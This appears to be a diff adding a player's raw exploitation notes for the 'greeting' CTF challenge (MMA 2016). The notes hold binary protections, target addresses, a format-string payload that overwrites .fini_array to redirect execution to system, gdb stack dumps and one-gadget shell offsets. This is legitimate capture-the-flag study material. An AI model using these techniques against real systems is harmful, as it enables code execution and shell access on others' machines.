@@ -1,0 +1,92 @@
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+
+
+0x8049934 - .fini_array
+0x8048779 - system
+
+
+%9x = 0x000x80487791f
+
+
+ r < <(python -c 'print "\x34\x99\x04\x08" +"%34659x"+"%23$hn"')
+
+
+gdb-peda$ telescope 50
+0000| 0xffffd470 --> 0xffffd48c ("Nice to meet you, 4\231\004\b%34659x%23$hn :)\n")
+0004| 0xffffd474 --> 0x80487d0 ("Nice to meet you, %s :)\n")
+0008| 0xffffd478 --> 0xffffd4cc --> 0x8049934 --> 0x80485a0 (<__do_global_dtors_aux>:	cmp    BYTE PTR ds:0x8049aa4,0x0)
+0012| 0xffffd47c --> 0x0 
+0016| 0xffffd480 --> 0x0 
+0020| 0xffffd484 --> 0x0 
+0024| 0xffffd488 --> 0x0 
+0028| 0xffffd48c ("Nice to meet you, 4\231\004\b%34659x%23$hn :)\n")
+0032| 0xffffd490 (" to meet you, 4\231\004\b%34659x%23$hn :)\n")
+0036| 0xffffd494 ("meet you, 4\231\004\b%34659x%23$hn :)\n")
+0040| 0xffffd498 (" you, 4\231\004\b%34659x%23$hn :)\n")
+0044| 0xffffd49c --> 0x9934202c 
+0048| 0xffffd4a0 --> 0x33250804 
+0052| 0xffffd4a4 ("4659x%23$hn :)\n")
+0056| 0xffffd4a8 ("x%23$hn :)\n")
+0060| 0xffffd4ac ("$hn :)\n")
+0064| 0xffffd4b0 --> 0xa293a (':)\n')
+0068| 0xffffd4b4 --> 0xf7fee030 (<_dl_runtime_resolve+16>:	pop    edx)
+0072| 0xffffd4b8 --> 0xf7e4d85e (<do_system+14>:	add    esi,0x1777a2)
+0076| 0xffffd4bc --> 0x8049a28 --> 0x804993c --> 0x1 
+0080| 0xffffd4c0 --> 0x2 
+0084| 0xffffd4c4 --> 0x1 
+0088| 0xffffd4c8 --> 0xffffd4e8 --> 0x1 
+0092| 0xffffd4cc --> 0x8049934 --> 0x80485a0 (<__do_global_dtors_aux>:	cmp    BYTE PTR ds:0x8049aa4,0x0)
+0096| 0xffffd4d0 ("%34659x%23$hn")
+--More--(25/50)
+0100| 0xffffd4d4 ("59x%23$hn")
+0104| 0xffffd4d8 ("23$hn")
+0108| 0xffffd4dc --> 0x800006e 
+0112| 0xffffd4e0 --> 0x1 
+0116| 0xffffd4e4 --> 0x0 
+0120| 0xffffd4e8 --> 0x1 
+0124| 0xffffd4ec --> 0x8048722 (<__libc_csu_init+82>:	add    edi,0x1)
+0128| 0xffffd4f0 --> 0x1 
+0132| 0xffffd4f4 --> 0xffffd5b4 --> 0xffffd6fb ("/home/vagrant/CTFs/mma16/greeting/greeting")
+0136| 0xffffd4f8 --> 0xffffd5bc --> 0xffffd726 ("USER=vagrant")
+0140| 0xffffd4fc --> 0xf7e41c0b (<__GI___cxa_atexit+27>:	add    esp,0x10)
+0144| 0xffffd500 --> 0xf7fc53dc --> 0xf7fc61e0 --> 0x0 
+0148| 0xffffd504 --> 0x8048258 --> 0x67 ('g')
+0152| 0xffffd508 --> 0x80486db (<__libc_csu_init+11>:	add    ebx,0x134d)
+0156| 0xffffd50c --> 0xadc86a00 
+0160| 0xffffd510 --> 0xf7fc5000 --> 0x1b1db0 
+0164| 0xffffd514 --> 0xf7fc5000 --> 0x1b1db0 
+0168| 0xffffd518 --> 0x0 
+0172| 0xffffd51c --> 0xf7e2b637 (<__libc_start_main+247>:	add    esp,0x10)
+0176| 0xffffd520 --> 0x1 
+0180| 0xffffd524 --> 0xffffd5b4 --> 0xffffd6fb ("/home/vagrant/CTFs/mma16/greeting/greeting")
+0184| 0xffffd528 --> 0xffffd5bc --> 0xffffd726 ("USER=vagrant")
+0188| 0xffffd52c --> 0x0 
+0192| 0xffffd530 --> 0x0 
+0196| 0xffffd534 --> 0x0 
+
+
+
+0x3ac69	execve("/bin/sh", esp+0x34, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x34] == NULL
+
+0x5fbc5	execl("/bin/sh", eax)
+constraints:
+  esi is the GOT address of libc
+  eax == NULL
+
+0x5fbc6	execl("/bin/sh", [esp])
+constraints:
+  esi is the GOT address of libc
+  [esp] == NULL
+
+
+
+234 = 0xfc
+
+34306 = 0xc16
